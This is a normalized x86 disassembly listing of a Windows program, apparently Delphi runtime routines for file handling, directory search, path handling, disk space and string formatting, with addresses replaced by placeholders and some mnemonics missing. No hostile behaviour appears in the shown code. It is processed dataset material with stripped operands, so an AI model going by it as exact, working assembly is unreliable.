test edx edx
jl r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov ebx eax
mov edi [ ebp - 0x14 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x14 ]
call sub_405324
push eax
push esi
mov eax [ ebp - 0x10 ]
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
sete al
test al al
je r-xdata
sub edi 0x4
mov edi [ edi ]
add ebx 0x4
dec [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
sub_409ba4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40b95c
mov edx eax
test dl dl
je r-xdata
call sub_409a90
push ebp
mov eax [ rw-data ]
call sub_406250
mov edx eax
mov eax [ rw-data ]
call sub_409b20
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_406250
mov edx eax
mov eax [ rw-data ]
call sub_409b20
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_409c40
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_404e98
call sub_409a90
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404e98
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404e98
jmp r-xdata
pop esi
pop ebx
retn
sub_409c8c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_405324
push eax
call CreateFileA
sub_409ce4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_409d10
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_409d3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call GetLastError
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
sub_409d8c
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_405324
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_409df4
push ebx
mov ebx eax
mov eax ebx
call sub_405324
push eax
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop ebx
retn
test al 0x10
je r-xdata
mov al 0x1
pop ebx
retn
sub_409e18
push ebx
mov ebx eax
mov eax ebx
call sub_405324
push eax
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
xor eax eax
pop ebx
retn
test al 0x10
jne r-xdata
mov al 0x1
pop ebx
retn
sub_409e3c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_409f25
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40e8d4
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_404edc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
mov edx eax
mov [ edx + 0xc ] 0x3
mov eax edx
call sub_4047d8
cmp eax 0x3
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x4 ]
call sub_409e18
mov al 0x1
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40a0f8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405270
sete al
mov al 0x1
jmp r-xdata
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409f2c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40a0f8
mov eax [ ebp - 0x10 ]
call sub_409e3c
test al al
je r-xdata
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40a2ec
test al al
jne r-xdata
mov bl 0x1
sub_409f34
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
push edi
mov eax esi
call sub_405324
push eax
call SetFileAttributesA
test eax eax
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call GetLastError
mov ebx eax
sub_409f5c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x20 ]
and eax [ ebx + 0x18 ]
jne r-xdata
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileA
test eax eax
jne r-xdata
push esp
lea eax [ ebx + 0x34 ]
push eax
call FileTimeToLocalFileTime
push ebx
lea eax [ ebx + 0x2 ]
push eax
lea eax [ esp + 0x8 ]
push eax
call FileTimeToDosDateTime
mov eax [ ebx + 0x40 ]
xor edx edx
push edx
push eax
mov eax [ ebx + 0x3c ]
xor edx edx
mov edx eax
xor eax eax
or eax [ esp ]
or edx [ esp + 0x4 ]
add esp 0x8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x10 ] eax
lea eax [ ebx + 0x14 ]
lea edx [ ebx + 0x4c ]
mov ecx 0x104
call sub_4050b4
xor esi esi
call GetLastError
mov esi eax
jmp r-xdata
mov eax esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_409fe0
push ebx
push esi
push edi
mov ebx ecx
mov edi eax
not edx
and edx 0x16
mov [ ebx + 0x18 ] edx
lea eax [ ebx + 0x20 ]
push eax
mov eax edi
call sub_405324
push eax
call FindFirstFileA
mov esi eax
mov [ ebx + 0x1c ] esi
cmp esi 0xffffffff
je r-xdata
call GetLastError
mov esi eax
mov eax ebx
call sub_409f5c
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40a054
jmp r-xdata
sub_40a030
push ebx
mov ebx eax
lea eax [ ebx + 0x20 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
call FindNextFileA
test eax eax
je r-xdata
call GetLastError
pop ebx
retn
mov eax ebx
call sub_409f5c
pop ebx
retn
sub_40a070
push ebx
push esi
mov esi eax
mov eax esi
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40e55c
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40a0a4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
test eax eax
je r-xdata
mov edi eax
mov eax ebx
call sub_405324
mov ebp eax
test edi edi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ebx [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_40a4c8
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40e55c
cmp al 0x2
jne r-xdata
dec edi
sub_40a0f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40a0a4
mov esi eax
push edi
mov ecx esi
mov edx 0x1
mov eax ebx
call sub_405384
pop edi
pop esi
pop ebx
retn
sub_40a12c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40a0a4
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_405384
pop edi
pop esi
pop ebx
retn
sub_40a164
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40a0a4
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404e44
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_405384
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40a1ac
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_405324
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404f34
add esp 0x108
pop esi
pop ebx
retn
sub_40a1e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_405f54
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_405f54
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_40a25c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
movzx esi [ ebp - 0x2 ]
mov ecx esi
and cx 0x1f
movzx ebx [ ebp - 0x2 ]
mov edx ebx
shr edx 0x5
and dx 0xf
mov eax ebx
shr eax 0x9
add ax 0x7bc
call sub_40bc44
fstp [ ebp - 0x18 ]
fwait
push 0x0
movzx ecx [ ebp - 0x4 ]
and cx 0x1f
add ecx ecx
movzx edi [ ebp - 0x4 ]
mov edx edi
shr edx 0x5
and dx 0x3f
mov eax edi
shr eax 0xb
call sub_40baa0
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a344
sub edx eax
test eax 0x1
push eax
je r-xdata
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
movzx ecx [ edx + eax ]
mov [ eax ] cl
test ecx ecx
je r-xdata
mov [ eax ] cl
pop eax
retn
movzx ecx [ edx + eax ]
mov [ eax ] cx
add eax 0x2
cmp ecx 0xff
ja r-xdata
pop eax
retn
inc eax
sub_40a37c
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40a3b0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx esi
test ebx ebx
je r-xdata
mov eax esi
call sub_405324
mov edx eax
mov ecx ebx
mov eax edi
call sub_40a37c
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_40a3d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_405324
mov edx eax
mov ecx edi
mov eax ebx
call sub_40a37c
pop edi
pop esi
pop ebx
retn
sub_40a3f8
sub edx eax
jne r-xdata
movzx ecx [ edx + eax ]
cmp cl [ eax ]
jne r-xdata
xor eax eax
retn
movzx eax [ eax ]
sub eax ecx
retn
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
add eax 0x1
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
add eax 0x1
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x3 ]
cmp cl [ eax + 0x3 ]
jne r-xdata
add eax 0x1
add eax 0x4
test cl cl
je r-xdata
sub eax 0x4
movzx ecx [ edx + eax ]
cmp cl [ eax ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x2 ]
cmp cl [ eax + 0x2 ]
jne r-xdata
test cl cl
je r-xdata
movzx ecx [ edx + eax + 0x3 ]
cmp cl [ eax + 0x3 ]
jne r-xdata
add eax 0x4
test cl cl
jne r-xdata
sub_40a484
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40a4dc
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_40a550
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_40a308
mov esi eax
inc esi
mov eax esi
call sub_40a530
mov ecx esi
mov edx ebx
call sub_40a334
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_40a58c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40e580
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_40a334
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_408fc0
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_40a614
push ebp
mov ebp esp
push ebx
movzx ebx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_40b2ac
pop ebx
pop ebp
retn 0x10
sub_40a634
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_40a98b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40a716
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_40a75e
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40a716
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40a608
pop edx
or edx edx
je r-xdata
sub_40a716
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_40a98b
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40a75e
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_40a98b
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_40a58c
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_40a785 ]
mov ebx ecx
sub cl 0x44
je sub_40989c
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_40506c
jmp r-xdata
mov esi sub_4050e8
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_40989c
sub cl 0x44
je sub_409830
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_409830
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40989c
mov ecx 0x10
cmp bl 0x58
je sub_409830
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40a5e4
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_40afd8
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_409830
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_40a9ac
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_40ad07
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40aa8e
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_40aad6
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40aa8e
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40a608
pop edx
or edx edx
je r-xdata
sub_40aa8e
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0x10 ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_40ad07
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_40aad6
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0xc ]
jg r-xdata
call sub_40ad07
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_40a58c
inc [ ebp - 0xc ]
mov esi [ ebp + 0x10 ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_40aafd ]
mov ebx ecx
sub cl 0x44
je sub_40989c
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_40506c
jmp r-xdata
mov esi sub_4050e8
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_40989c
sub cl 0x44
je sub_409830
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_409830
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40989c
mov ecx 0x10
cmp bl 0x58
je sub_409830
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40a5e4
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
